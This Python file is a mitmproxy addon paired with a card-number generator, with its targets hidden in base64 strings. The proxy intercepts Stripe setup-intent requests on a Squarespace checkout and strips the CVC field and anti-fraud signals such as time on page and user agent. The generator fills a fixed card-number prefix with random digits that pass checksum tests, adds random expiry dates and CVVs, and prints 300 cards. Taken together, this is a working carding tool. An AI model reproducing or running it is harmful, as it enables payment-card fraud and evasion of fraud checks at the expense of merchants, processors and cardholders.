import base64
import datetime
import random
from urllib.parse import parse_qs, urlencode

from mitmproxy import http


def request(flow: http.HTTPFlow) -> None:
    if flow.request.method in ["POST"] and get_field("L3YxL3NldHVwX2ludGVudHM=") in flow.request.path:
        # Check if the Content-Type is 'application/x-www-form-urlencoded'

        if flow.request.headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
            # Decode the request content from bytes to string

            body = flow.request.content.decode("utf-8")
            if get_field("c3F1YXJlc3BhY2UuY29t") in body and get_field(
                    "cGtfbGl2ZV9kZVJDNlJUOFZ2ejRjSjFlZ0lLbmsxNlM=") in body:
                # Parse the form data
                form_data = parse_qs(body)

                del form_data[get_field("cGF5bWVudF9tZXRob2RfZGF0YVtjYXJkXVtjdmNd=")]

                if get_field("cGF5bWVudF9tZXRob2RfZGF0YVtwYXN0ZWRfZmllbGRzXQ") in form_data.keys():
                    del form_data[get_field("cGF5bWVudF9tZXRob2RfZGF0YVtwYXN0ZWRfZmllbGRzXQ")]
                if get_field("cGF5bWVudF9tZXRob2RfZGF0YVt0aW1lX29uX3BhZ2Vd") in form_data.keys():
                    del form_data[get_field("cGF5bWVudF9tZXRob2RfZGF0YVt0aW1lX29uX3BhZ2Vd")]
                if get_field(
                        "cGF5bWVudF9tZXRob2RfZGF0YVtwYXltZW50X3VzZXJfYWdlbnRd") in form_data.keys():
                    del form_data[get_field("cGF5bWVudF9tZXRob2RfZGF0YVtwYXltZW50X3VzZXJfYWdlbnRd")]

                print("oke Form Data:", form_data)

                # Encode the modified form data back to URL-encoded format
                modified_body = urlencode(form_data, doseq=True)

                # Update the request content with the modified body
                flow.request.content = modified_body.encode("utf-8")

                # Update Content-Length header
                flow.request.headers["Content-Length"] = str(len(flow.request.content))


def parse_x_www_form_urlencoded(data):
    result = {}
    for item in data.split('&'):
        key, value = item.split('=')
        result[key] = value.replace('+', ' ').replace('%20', ' ')
    return result


def delete_from_array(array, element):
    try:
        del array[element]
    except:
        pass
    return array


def build_x_www_form_urlencoded(data):
    result = []
    for key, value in data.items():
        value = value.replace(' ', '+')
        result.append(f"{key}={value}")
    return '&'.join(result)


def gencc(U):
    while True:
        if len(U) < 16:
            U = U + 'x'
        else:
            break

    def C(L):
        def B(n): return [int(A) for A in str(n)]

        C = B(L);
        D = C[-1::-2];
        E = C[-2::-2];
        A = 0;
        A += sum(D)
        for F in E: A += sum(B(F * 2))
        return A % 10

    def D(x, t):
        def G(aS, n):
            aS = str(aS)
            if n >= 1:
                A = aS[-n:]
            else:
                A = ''
            return A

        def C(aS, n, n2=None):
            A = n2;
            aS = str(aS)
            if A is None or A == '': A = len(aS)
            n, A = int(n), int(A)
            if n < 0: n += 1
            B = aS[n - 1:n - 1 + A];
            return B

        def B(x, t=1):
            x = str(x)
            if t > 0:
                while len(x) > t: A = sum([int(x[A]) for A in range(len(x))]);x = str(A)
            else:
                for B in range(abs(t)): A = sum([int(x[A]) for A in range(len(x))]);x = str(A)
            return int(x)

        D = False;
        E = '';
        A = 1
        for H in range(1, len(x)):
            I = int(C(x, H, 1)) * int(C('21', A, 1));
            E += str(B(I));
            A += 1
            if A > len('21'): A = 1
        F = B(E, -1)
        if (10 * B(F, -1) - F) % 10 == int(G(x, 1)): D = True
        return D

    while True:
        A = ''
        for B in U:
            if len(A) < 16 and 'x' == B.lower():
                A += str(random.randint(0, 9))
            else:
                A += str(B)
        if C(A) == 0 and D(A, random.randint(0, 9)): return A, str(random.choice(list(range(1, 13)))).zfill(2), str(
            random.choice(list(range(datetime.date.today().year + 1, datetime.date.today().year + 8))))[-2:], str(
            random.randrange(1000)).zfill(3)


def checkcc(A, C):
    if A == "": return True
    while True:
        if len(A) < 16:
            A = A + 'x'
        else:
            break
    if len(A) != len(C): return False
    for B in range(len(A)):
        if A[B] != 'x' and A[B] != C[B]: return False
    return True


def get_field(proxy_field):
    # Fix padding
    missing_padding = len(proxy_field) % 4
    if missing_padding != 0:
        proxy_field += '=' * (4 - missing_padding)

    # Decode the base64 string
    try:
        return base64.b64decode(proxy_field).decode("utf-8")
    except Exception as e:
        return f"Error decoding base64 string: {e}"


if __name__ == '__main__':
    i = 0
    while i < 300:
        print(gencc("542550300302"))
        i = i + 1
